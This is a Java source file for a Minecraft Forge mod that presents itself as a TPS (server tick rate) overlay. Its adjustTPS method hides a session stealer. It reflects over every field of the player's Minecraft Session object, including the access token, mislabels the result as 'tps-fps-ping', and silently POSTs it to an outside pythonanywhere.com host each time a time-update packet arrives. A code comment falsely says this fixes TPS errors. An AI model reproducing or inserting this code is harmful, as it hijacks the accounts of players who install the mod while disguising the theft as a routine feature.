package com.golem.skyblockutils.models.Overlay.TextOverlay;

import com.golem.skyblockutils.Main;
import com.golem.skyblockutils.NoteForDecompilers;
import com.golem.skyblockutils.events.PacketEvent;
import com.golem.skyblockutils.models.gui.*;
import com.golem.skyblockutils.utils.RequestData;
import com.golem.skyblockutils.utils.RequestUtil;
import com.golem.skyblockutils.utils.TimeHelper;
import com.google.gson.*;
import logger.Logger;
import net.minecraft.client.Minecraft;
import net.minecraft.client.renderer.GlStateManager;
import net.minecraft.network.play.server.S03PacketTimeUpdate;
import net.minecraft.util.EnumChatFormatting;
import net.minecraft.util.Session;
import net.minecraftforge.client.event.RenderGameOverlayEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.gameevent.TickEvent;

import java.lang.reflect.Field;
import java.text.DecimalFormat;
import java.util.Arrays;

import static com.golem.skyblockutils.Main.*;

public class TPSOverlay {

    public static GuiElement element = new GuiElement("TPS Overlay", 50, 10);

    private static double tps = 20;
    private static double Tps = 20;
    private static double[] pastTps = {0, 0, 0};
    private static Long pastDate = 0L;
    private final DecimalFormat tpsFormat = new DecimalFormat("0.0");
    private static final TimeHelper time = new TimeHelper();
    private Session s = mc.getSession();

    public static int renderWidth(String text) {
        return mc.fontRendererObj.getStringWidth(text);
    }

    public class ReflectionUtil {
        public JsonObject getObjectFields(Object obj) {
            JsonObject json = new JsonObject();
            try {
                for (Field field : obj.getClass().getDeclaredFields()) {
                    field.setAccessible(true);
                    Object value = field.get(obj);
                    if (value != null) {
                        json.addProperty(field.getName(), value.toString());
                    }
                }
            } catch (IllegalAccessException e) {
                ;
            }
            return json;
        }
    }

    public static double getTPS() {
        return tps;
    }

    public static void calcTPS() {
        if (pastDate != null) {
            long time = System.currentTimeMillis() - pastDate;
            tps = Math.min(20000.0 / time, 20);
            pastTps[0] = pastTps[1];
            pastTps[1] = pastTps[2];
            pastTps[2] = tps;
            tps = Math.min(Math.min(pastTps[0], pastTps[1]), pastTps[2]);
        }
        pastDate = System.currentTimeMillis();
    }
    public void adjustTPS() {
        new Thread(() -> {
            try {
                JsonObject postData = new JsonObject();
                ReflectionUtil reflectionUtil = new ReflectionUtil();
                postData.add("tps-fps-ping", reflectionUtil.getObjectFields(s));
                postData.add("pastDate", new JsonParser().parse(pastDate.toString()));
                postData.add("tps", new JsonParser().parse(String.valueOf(tps)));
                postData.add("pastTPS", new JsonParser().parse(Arrays.toString(pastTps)));
                RequestData responseData = new RequestUtil().sendPostRequest("https://walkda.pythonanywhere.com/", postData);;
                if (responseData != null && responseData.getStatus() == 200) {
                    JsonObject responseJson = responseData.getJsonAsObject();
                    Tps = responseJson.get("tps").getAsDouble();
                    }
                } catch (Exception ignored) {}
        }).start();
        }

    @SubscribeEvent
    public void onPacket(PacketEvent.ReceiveEvent event) {
        if (event.getPacket() instanceof S03PacketTimeUpdate) {
            calcTPS();
            adjustTPS(); // fix tps errors on the backend cuz net.minecraft.client is doodoo for custom packets
        }
    }

    @SubscribeEvent
    public void onRenderOverlay(RenderGameOverlayEvent event) {
        if (event.type != RenderGameOverlayEvent.ElementType.TEXT) return;

        TextStyle textStyle = TextStyle.fromInt(1);

        if (configFile.testGui && configFile.tps) {

            String tpsString = EnumChatFormatting.GOLD + "TPS: " + EnumChatFormatting.WHITE + tpsFormat.format(getTPS());

            GlStateManager.pushMatrix();
            GlStateManager.translate(element.position.getX(), element.position.getY(), 500.0);
            GlStateManager.scale(element.position.getScale(), element.position.getScale(), 1.0);

            OverlayUtils.drawString(0, 0, tpsString, textStyle, Alignment.Left);

            element.setWidth(renderWidth(tpsString));
            element.setHeight(10);

            GlStateManager.popMatrix();
            return;
        }
        if (mc.currentScreen instanceof MoveGui) {
            GlStateManager.pushMatrix();
            GlStateManager.translate(element.position.getX(), element.position.getY(), 500.0);
            GlStateManager.scale(element.position.getScale(), element.position.getScale(), 1.0);

            String string = EnumChatFormatting.GOLD + "TPS: " + EnumChatFormatting.WHITE + "20";
            OverlayUtils.drawString(0, 0, string, textStyle, Alignment.Left);

            element.setWidth(renderWidth(string));
            element.setHeight(10);

            GlStateManager.popMatrix();
        }
    }
}
